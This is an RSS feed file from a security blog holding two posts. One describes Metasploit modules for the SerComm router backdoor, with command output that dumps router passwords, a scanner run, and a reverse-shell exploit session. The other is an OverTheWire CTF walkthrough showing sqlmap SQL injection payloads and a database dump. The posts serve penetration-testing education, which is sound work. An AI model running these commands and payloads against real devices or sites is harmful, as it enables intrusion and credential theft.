@@ -1,0 +1,3285 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Linux on Matt Andreko</title>
+    <link>https://www.mattandreko.com/categories/linux/index.xml</link>
+    <description>Recent content in Linux on Matt Andreko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <atom:link href="https://www.mattandreko.com/categories/linux/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Backdoor Modules for Netgear, Linksys, and Other Routers</title>
+      <link>https://www.mattandreko.com/blog/2014-01-13-backdoor-modules-for-netgear-linksys-and-other-routers/</link>
+      <pubDate>Mon, 13 Jan 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2014-01-13-backdoor-modules-for-netgear-linksys-and-other-routers/</guid>
+      <description>
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/backdoor_all_the_routers.jpg#left&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;A week or so ago, I read the news of a new backdoor on several devices, including those made by &lt;a href=&#34;http://www.belkin.com/&#34;&gt;Belkin&lt;/a&gt;, &lt;a href=&#34;http://www.cisco.com/&#34;&gt;Cisco&lt;/a&gt;, &lt;a href=&#34;http://www.netgear.com&#34;&gt;NetGear&lt;/a&gt;, &lt;a href=&#34;http://www.linksys.com&#34;&gt;Linksys&lt;/a&gt;, and several others. A list of what seems to be affected devices can be found &lt;a href=&#34;http://wikidevi.com/w/index.php?title=Special%3AAsk&amp;amp;q=%5B%5BManuf%3A%3ASerComm%5D%5D+%5B%5BGlobal+type%3A%3A~embedded*%5D%5D&amp;amp;po=%3FFCC+ID%0D%0A%3FFCC+approval+date%3DFCC+date%0D%0A%3FEstimated+date+of+release%3DEst.+release+date%0D%0A%3FEmbedded+system+type%0D%0A%3FCPU1+brand%0D%0A%3FCPU1+model%3DCPU1+mdl.%0D%0A&amp;amp;eq=yes&amp;amp;p%5Bformat%5D=broadtable&amp;amp;sort_num=&amp;amp;order_num=ASC&amp;amp;p%5Blimit%5D=500&amp;amp;p%5Boffset%5D=&amp;amp;p%5Blink%5D=all&amp;amp;p%5Bsort%5D=&amp;amp;p%5Bheaders%5D=show&amp;amp;p%5Bmainlabel%5D=&amp;amp;p%5Bintro%5D=&amp;amp;p%5Boutro%5D=&amp;amp;p%5Bsearchlabel%5D=%25E&#34;&gt;here&lt;/a&gt;. &lt;a href=&#34;https://twitter.com/elvanderb&#34;&gt;Eloi Vanderbeken&lt;/a&gt;, who posted his findings on &lt;a href=&#34;https://github.com/elvanderb/TCP-32764&#34;&gt;GitHub&lt;/a&gt; made the original discovery. He also wrote a useful python proof-of-concept exploit, which allowed command injection, but I wanted &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; integration.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;After playing with the proof-of-concept, I realized how powerful this backdoor could be. As I&amp;rsquo;m doing penetration tests for large enterprises, I&amp;rsquo;m still amazed that I find small consumer-grade routers all the time. With this backdoor, however, I could gain leverage into certain networks, gain credentials, or all kinds of other fun. That&amp;rsquo;s where all my learning started.&lt;/p&gt;
+
+&lt;div style=&#34;clear:both;&#34;&gt;&lt;/div&gt;
+
+&lt;h2 id=&#34;configuration-dump-module&#34;&gt;Configuration Dump Module&lt;/h2&gt;
+
+&lt;p&gt;So the first module I wrote, with the help of &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, was to dump the configuration of the device&amp;rsquo;s nvram. This is useful to an attacker for a couple reasons:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;It contains clear-text passwords to the device, which can often be used to login to the remote management console.&lt;/li&gt;
+&lt;li&gt;In case the device gets messed up from attacking it, all the configuration values can be restored at a later time from the dump.&lt;/li&gt;
+&lt;li&gt;It contains passwords, sweet passwords! People re-use their passwords everywhere, and you now have valid passwords.&lt;/li&gt;
+&lt;li&gt;Did I mention the passwords?&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Below is a demonstration of the module running. Note the wireless SSID, keys, and additional credentials being uncovered, without having to supply any credentials:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfcli auxiliary/admin/misc/sercomm_dump_config RHOST=192.168.1.1 E
+[*] Initializing modules...
+RHOST =&amp;gt; 192.168.1.1
+[*] 192.168.1.1:32764 - Attempting to connect and check endianess...
+[+] 192.168.1.1:32764 - Big Endian device found...
+[*] 192.168.1.1:32764 - Attempting to connect and dump configuration...
+[*] 192.168.1.1:32764 - Router configuration dump stored in: /Users/mandreko/.msf4/loot/20140113231717_default_192.168.1.1_router.config_104290.txt
+[*] 192.168.1.1:32764 - Wifi SSID: Netgear15
+[*] 192.168.1.1:32764 - Wifi Key 1: 2A17B75F3D
+[*] 192.168.1.1:32764 - Wifi Key 2: C65EFCF158
+[*] 192.168.1.1:32764 - Wifi Key 3: 3066C6DDE6
+[*] 192.168.1.1:32764 - Wifi Key 4: 1F397B65CA
+[*] 192.168.1.1:32764 - HTTP Web Management: User: admin Pass: password
+[*] 192.168.1.1:32764 - PPPoE: User: mandreko_dsl Pass: isreallysecure1
+[*] 192.168.1.1:32764 - PPPoA: User: mandreko_dsl Pass: isreallysecure1
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just tonight, I found that in some of the refactoring we did, the credential collection actually broke, so I made a &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2878&#34;&gt;pull-request&lt;/a&gt; to fix it (in case anyone wants to try it before it&amp;rsquo;s merged to trunk). The above output was using the newer code.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-scanner-module&#34;&gt;The Scanner Module&lt;/h2&gt;
+
+&lt;p&gt;So we can dump the nvram configuration of a device. But what good is that if you&amp;rsquo;re unable to find vulnerable devices on the network? In came module number two, the scanner, which could scan all sorts of network ranges. In the below sample, I scanned my test network for the vulnerability, and it found my device, and detected the endianness it was communicating over. You see, MIPS, unlike x86, which is always little endian, can be big or little endian, depending on the processor. Some can even be both, I&amp;rsquo;m told. However, you need to know which, to know how to communicate with the device. You can start to see how learning MIPS was going to be fun.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfcli auxiliary/scanner/misc/sercomm_backdoor_scanner RHOSTS=192.168.1.0/24 THREADS=64 E
+[*] Initializing modules...
+RHOSTS =&amp;gt; 192.168.1.0/24
+THREADS =&amp;gt; 64
+[+] 192.168.1.1:32764 - Possible backdoor detected - Big Endian
+[*] Scanned 036 of 256 hosts (014% complete)
+[*] Scanned 058 of 256 hosts (022% complete)
+[*] Scanned 083 of 256 hosts (032% complete)
+[*] Scanned 105 of 256 hosts (041% complete)
+[*] Scanned 129 of 256 hosts (050% complete)
+[*] Scanned 157 of 256 hosts (061% complete)
+[*] Scanned 196 of 256 hosts (076% complete)
+[*] Scanned 205 of 256 hosts (080% complete)
+[*] Scanned 233 of 256 hosts (091% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;the-journey-to-an-exploit&#34;&gt;The journey to an exploit&lt;/h2&gt;
+
+&lt;p&gt;So the first two modules really didn&amp;rsquo;t take a long time to write. The scanner for example, was all of 30 minutes, since &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; has so many nice mix-ins, and libraries already available. The bulk of my last week and a half was spent learning MIPS, and how to generate working payloads. Let me take you on my journey&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Initially, I tried using the payloads in Metasploit, since they&amp;rsquo;ve recently added MIPSBE and MIPSLE (big endian and little endian respectively). However, on my testing device, none of the payloads would work. I figured that it would probably be pretty easy to compile for MIPS based devices, since people do ARM all the time with iOS and Android development. Boy was I wrong. I spent 3 days trying to get a working toolchain. I installed the &lt;a href=&#34;http://buildroot.uclibc.org/&#34;&gt;uclibc Buildroot&lt;/a&gt; toolchain, and found that it&amp;rsquo;s documentation was a bit hard to decipher for a newbie like me. I tried using &lt;a href=&#34;http://www.mentor.com/embedded-software/sourcery-tools/sourcery-codebench/editions/lite-edition/&#34;&gt;Sourcery Codebench&lt;/a&gt;, but again was foiled, because I couldn&amp;rsquo;t target the correct MIPS processors. Eventually I was reading about using &lt;a href=&#34;http://www.gentoo.org&#34;&gt;Gentoo&lt;/a&gt; with its &amp;ldquo;crossdev&amp;rdquo; package.&lt;/p&gt;
+
+&lt;p&gt;After a day of compiling, I had a working base image. From there, I installed crossdev per the documentation. Additionally, I had it create cross-compilers for my MIPS target. (This took several hours to figure out how to get right) In case anyone wants it, this worked for me:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# emerge crossdev
+# CBUILD=x86_64-pc-linux-gnu CHOST=x86_64-pc-linux-gnu CTARGET=mips-pc-linux-uclibc USE=-nptl crossdev --target mips-pc-linux-uclibc --without-headers
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Amazing! I could build executables! I made a simple HelloWorld app, and compiled it. It then ran on my test device. I was in business. I just had to figure out how to make a new template in Metasploit, which was going to be no fun at all.&lt;/p&gt;
+
+&lt;p&gt;I started talking with &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, and I mentioned that my exploit module would now upload the binary payload, but would never run, giving all sorts of random errors. However, if I manually ran &amp;lsquo;msfpayload&amp;rsquo;, and uploaded the output, it would work. For some reason I had never tried this, because I do things the hard way sometimes. When we were talking, something I said apparently made him think about it. He came back, and told me he found something. Intrigued, I asked for more information, and he showed me a typo in the core libraries that he then made into a &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2849/files&#34;&gt;pull-request&lt;/a&gt;. It was a simple mistake, which was probably looked over several times. The  MIPSBE payloads were being encoded with a MIPSLE encoder, which just messed up everything.&lt;/p&gt;
+
+&lt;p&gt;After he merged the pull request, the skies turned blue, and a little rainbow appeared. Payloads were being generated in my module successfully, and giving me shells. Then, I realized that all the time I spent building a &lt;a href=&#34;http://www.gentoo.org&#34;&gt;Gentoo&lt;/a&gt; crossdev environment, and installing all kinds of tools were pretty much wasted, since it was all just due to a single character typo. On the bright side, the time wasn&amp;rsquo;t really wasted, as I did learn a &lt;em&gt;lot&lt;/em&gt; about MIPS, since I was starting to read on shellcoding too.&lt;/p&gt;
+
+&lt;h1 id=&#34;the-smell-of-fresh-shells-in-the-morning&#34;&gt;The smell of fresh shells in the morning&lt;/h1&gt;
+
+&lt;p&gt;So after all that time messing with MIPS and &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; ruby code, I had something working, which would actually get a shell. However, as I quickly learned over this past weekend, I forgot to account for little endian devices on the exploit. I had even written code to detect the endianness on the scanner and config dump modules, but somehow on the important command injection vulnerability, had only tested on big endian. I came clean with &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, and told him to expect yet another pull request. He was able to make a quick fix, to get the module working for the next Pro release. I then worked to put together a new pull-request to add the little endian values.&lt;/p&gt;
+
+&lt;p&gt;During my testing over several devices, however, I found that sometimes devices that would talk to me using big endian, would sometimes require little endian payloads, and vice versa. It was odd, and I can&amp;rsquo;t explain it, but they did. So I added several new targets to my exploit, for specific devices, as well as 2 generic ones. As I get ahold of additional devices (or anyone else for that matter), the code will be updated to reflect those new values. Those changes will hopefully be merged into the trunk soon, but for now, the code can be accessed &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2874&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;To demonstrate this bug, I have exploited a NetGear WAP4410N device:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfconsole -r wap4410n.rc
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.pro %%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v4.9.0-dev [core:4.9 api:1.0] ]
++ -- --=[ 1251 exploits - 681 auxiliary - 201 post ]
++ -- --=[ 328 payloads - 32 encoders - 8 nops      ]
++ -- --=[ Answer Q&#39;s about Metasploit and win a WiFi Pineapple Mk5   ]
++ -- --=[ http://bit.ly/msfsurvey (Expires Wed Jan 22 23:59:59 2014) ]
+
+[*] Processing wap4410n.rc for ERB directives.
+resource (wap4410n.rc)&amp;gt; use exploit/linux/misc/sercomm_exec
+resource (wap4410n.rc)&amp;gt; set target 2
+target =&amp;gt; 2
+resource (wap4410n.rc)&amp;gt; set payload linux/mipsbe/shell_reverse_tcp
+payload =&amp;gt; linux/mipsbe/shell_reverse_tcp
+resource (wap4410n.rc)&amp;gt; set rhost 192.168.1.1
+rhost =&amp;gt; 192.168.1.1
+resource (wap4410n.rc)&amp;gt; set lhost 192.168.1.136
+lhost =&amp;gt; 192.168.1.136
+msf exploit(sercomm_exec) &amp;gt; show options
+
+Module options (exploit/linux/misc/sercomm_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.1.1      yes       The target address
+   RPORT  32764            yes       The target port
+
+
+Payload options (linux/mipsbe/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.136    yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   Cisco WAP4410N
+
+
+msf exploit(sercomm_exec) &amp;gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Generic Linux MIPS Big Endian
+   1   Generic Linux MIPS Little Endian
+   2   Cisco WAP4410N
+   3   Honeywell WAP-PL2 IP Camera
+   4   Netgear DG834
+   5   Netgear DG834G
+   6   Netgear DG834PN
+   7   Netgear DGN1000
+   8   Netgear DSG835
+   9   Netgear WPNT834
+
+
+msf exploit(sercomm_exec) &amp;gt; exploit
+
+[*] Started reverse handler on 192.168.1.136:4444
+[*] Command shell session 1 opened (192.168.1.136:4444 -&amp;gt; 192.168.1.1:2817) at 2014-01-14 00:33:02 -0500
+[*] Command Stager progress - 100.00% done (1415/1415 bytes)
+
+ls -al /
+drwxrwxrwx    8 0        0               0 var
+drwxr-xr-x    7 0        0              81 usr
+drwxrwxrwx    4 0        0               0 tmp
+drwxr-xr-x    2 0        0             217 sbin
+drwxr-xr-x    2 0        0              36 root
+dr-xr-xr-x   47 0        0               0 proc
+drwxr-xr-x    2 0        0              23 lost+found
+drwxr-xr-x    3 0        0             742 lib
+drwxr-xr-x    6 0        0             352 etc
+drwxr-xr-x    3 0        0             403 dev
+drwxr-xr-x    2 0        0             323 bin
+drwxr-xr-x   13 0        0             119 ..
+drwxr-xr-x   13 0        0             119 .
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At this point, command injection has been turned into a fully-fledged shell. As &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egyp7&lt;/a&gt; says, &amp;ldquo;I love shells&amp;rdquo;.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-scary-part&#34;&gt;The scary part&lt;/h2&gt;
+
+&lt;p&gt;So here you&amp;rsquo;ve seen how you can take a router, and get a shell on it. However the truly scary part is that several of these devices are listening on their WAN interface! That means a remote attacker can exploit your vulnerable router, and start mapping the inside of your network. Some devices support an SSH server, which you could then connect into, and make a dynamic socks proxy, or just forward ports. You already know the username and password to the SSH server, since you dumped all the passwords before, right?&lt;/p&gt;
+
+&lt;p&gt;Another attack could be to simply change the router&amp;rsquo;s DNS servers, so that when clients connect, it serves them with an evil DNS server, making all your sites go to a remote server, which then transparently steals your credentials.&lt;/p&gt;
+
+&lt;p&gt;You can go all tin-foil hat on this, and have some real fun. However, in the long run, I accomplished my goal, and now can compromise many of those devices I see on penetration tests, which really shouldn&amp;rsquo;t belong in the enterprise, and finally have something to back it up with, other than, &amp;ldquo;it says &amp;lsquo;Home&amp;rsquo; on the box&amp;hellip;&amp;rdquo;&lt;/p&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This was a really fun exercise, and taught me a lot about MIPS. This is also now one of my more favorite contributions.&lt;/p&gt;
+
+&lt;p&gt;In the near future, it sounds like there are going to be staged payloads for MIPS, so you don&amp;rsquo;t have to run the big un-staged ones. As more and more vulnerabilities start popping up on these &amp;ldquo;unconventional computers&amp;rdquo;, we&amp;rsquo;ll see more and more framework around exploiting them. I for one am excited.&lt;/p&gt;
+
+&lt;p&gt;Additionally, if you have any access to a vulnerable device, which isn&amp;rsquo;t currently a target in the exploit module, hit me up. I&amp;rsquo;d love to get more devices added, without buying 100 routers.&lt;/p&gt;
+
+&lt;p&gt;Lastly, I&amp;rsquo;d like to personally thank &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;. Without your help, these code contributions would have been much lower in quality, if existing at all. You rock.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Monxla Part 3</title>
+      <link>https://www.mattandreko.com/blog/2012-11-26-overthewire-monxla-part-3/</link>
+      <pubDate>Mon, 26 Nov 2012 05:58:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-26-overthewire-monxla-part-3/</guid>
+      <description>&lt;p&gt;Continuing from the last post, we are now logged in as a user. The next step on the PDF from the agent, that we can access, is the Notes Service.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;I started analyzing the source code, and noticed that the text that says &amp;ldquo;yes&amp;rdquo; or &amp;ldquo;no&amp;rdquo; in the table is actually an image being rendered from the hasnotes.php file. I started tinkering with that file, and found that it was vulnerable to SQL injection.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/monxla3_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I used &lt;a href=&#34;http://sqlmap.org&#34;&gt;SQLMap&lt;/a&gt; to automate the &lt;a href=&#34;https://en.wikipedia.org/wiki/SQL_injection&#34;&gt;SQL Injection Attack&lt;/a&gt; for me. I was pretty much able to just point it at the URL and go:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;bash-3.2$ ./sqlmap.py -u &amp;quot;http://nasenko.otw/hasnotes.php?username=boris&amp;amp;text=1&amp;quot; --random-agent --cookie=&amp;quot;SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1&amp;quot;
+
+    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 17:35:31
+
+[17:35:31] [INFO] fetched random HTTP User-Agent header from file &#39;/Users/mandreko/Development/sqlmap/txt/user-agents.txt&#39;: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.7) Gecko/20100726 CentOS/3.6-3.el5.centos Firefox/3.6.7
+[17:35:31] [INFO] resuming back-end DBMS &#39;mysql&#39; 
+[17:35:31] [INFO] testing connection to the target url
+[17:35:31] [INFO] heuristics detected web page charset &#39;ascii&#39;
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: username
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=boris&#39; AND 7400=7400 AND &#39;txSM&#39;=&#39;txSM&amp;amp;text=hi
+
+    Type: error-based
+    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: username=boris&#39; AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;bqmu&#39;=&#39;bqmu&amp;amp;text=hi
+
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;gt; 5.0.11 AND time-based blind
+    Payload: username=boris&#39; AND SLEEP(5) AND &#39;FtkC&#39;=&#39;FtkC&amp;amp;text=hi
+---
+[17:35:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
+web application technology: Apache 2.2.20, PHP 5.3.6
+back-end DBMS: MySQL 5.0
+[17:35:31] [INFO] fetched data logged to text files under &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw&#39;
+
+[*] shutting down at 17:35:31
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This was able to at least confirm my suspicions that a &lt;a href=&#34;https://en.wikipedia.org/wiki/SQL_injection&#34;&gt;SQL Injection Attack&lt;/a&gt; was possible.  I then attempted to have &lt;a href=&#34;http://sqlmap.org&#34;&gt;SQLMap&lt;/a&gt; list all the databases in the MySQL Server.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;bash-3.2$ ./sqlmap.py -u &amp;quot;http://nasenko.otw/hasnotes.php?username=boris&amp;amp;text=1&amp;quot; --random-agent --cookie=&amp;quot;SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1&amp;quot; --dbs
+
+    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 17:36:14
+
+[17:36:14] [INFO] fetched random HTTP User-Agent header from file &#39;/Users/mandreko/Development/sqlmap/txt/user-agents.txt&#39;: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)
+[17:36:14] [INFO] resuming back-end DBMS &#39;mysql&#39; 
+[17:36:14] [INFO] testing connection to the target url
+[17:36:14] [INFO] heuristics detected web page charset &#39;ascii&#39;
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: username
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=boris&#39; AND 7400=7400 AND &#39;txSM&#39;=&#39;txSM&amp;amp;text=hi
+
+    Type: error-based
+    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: username=boris&#39; AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;bqmu&#39;=&#39;bqmu&amp;amp;text=hi
+
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;gt; 5.0.11 AND time-based blind
+    Payload: username=boris&#39; AND SLEEP(5) AND &#39;FtkC&#39;=&#39;FtkC&amp;amp;text=hi
+---
+[17:36:14] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
+web application technology: Apache 2.2.20, PHP 5.3.6
+back-end DBMS: MySQL 5.0
+[17:36:14] [INFO] fetching database names
+[17:36:14] [INFO] the SQL query used returns 2 entries
+[17:36:14] [INFO] resumed: information_schema
+[17:36:14] [INFO] resumed: notes
+available databases [2]:
+[*] information_schema
+[*] notes
+
+[17:36:14] [INFO] fetched data logged to text files under &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw&#39;
+
+[*] shutting down at 17:36:14
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It appears that a &amp;ldquo;notes&amp;rdquo; table exists. It may be useful to view the contents:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;bash-3.2$ ./sqlmap.py -u &amp;quot;http://nasenko.otw/hasnotes.php?username=boris&amp;amp;text=1&amp;quot; --random-agent --cookie=&amp;quot;SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1&amp;quot; -D notes --dump
+
+    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 17:36:40
+
+[17:36:40] [INFO] fetched random HTTP User-Agent header from file &#39;/Users/mandreko/Development/sqlmap/txt/user-agents.txt&#39;: Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
+[17:36:40] [INFO] resuming back-end DBMS &#39;mysql&#39; 
+[17:36:40] [INFO] testing connection to the target url
+[17:36:40] [INFO] heuristics detected web page charset &#39;ascii&#39;
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: username
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=boris&#39; AND 7400=7400 AND &#39;txSM&#39;=&#39;txSM&amp;amp;text=hi
+
+    Type: error-based
+    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: username=boris&#39; AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;bqmu&#39;=&#39;bqmu&amp;amp;text=hi
+
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;gt; 5.0.11 AND time-based blind
+    Payload: username=boris&#39; AND SLEEP(5) AND &#39;FtkC&#39;=&#39;FtkC&amp;amp;text=hi
+---
+[17:36:40] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
+web application technology: Apache 2.2.20, PHP 5.3.6
+back-end DBMS: MySQL 5.0
+[17:36:40] [INFO] fetching tables for database: &#39;notes&#39;
+[17:36:40] [INFO] the SQL query used returns 2 entries
+[17:36:40] [INFO] resumed: notes
+[17:36:40] [INFO] resumed: users
+[17:36:40] [INFO] fetching columns for table &#39;notes&#39; in database &#39;notes&#39;
+[17:36:40] [INFO] the SQL query used returns 3 entries
+[17:36:40] [INFO] resumed: id
+[17:36:40] [INFO] resumed: int(11)
+[17:36:40] [INFO] resumed: username
+[17:36:40] [INFO] resumed: varchar(64)
+[17:36:40] [INFO] resumed: note
+[17:36:40] [INFO] resumed: text
+[17:36:40] [INFO] fetching entries for table &#39;notes&#39; in database &#39;notes&#39;
+[17:36:40] [INFO] the SQL query used returns 3 entries
+[17:36:40] [INFO] resumed: 1
+[17:36:40] [INFO] resumed: hello world
+[17:36:40] [INFO] resumed: boris
+[17:36:40] [INFO] resumed: 2
+[17:36:40] [INFO] resumed: Boris, you should really encrypt the passwords in the notes database! Love, your brother Vasili
+[17:36:40] [INFO] resumed: boris
+[17:36:40] [INFO] resumed: 3
+[17:36:40] [INFO] resumed: Vasili, I will look into that soon. For now, I just disabled the logins. Thanks! --Boris
+[17:36:40] [INFO] resumed: vasili
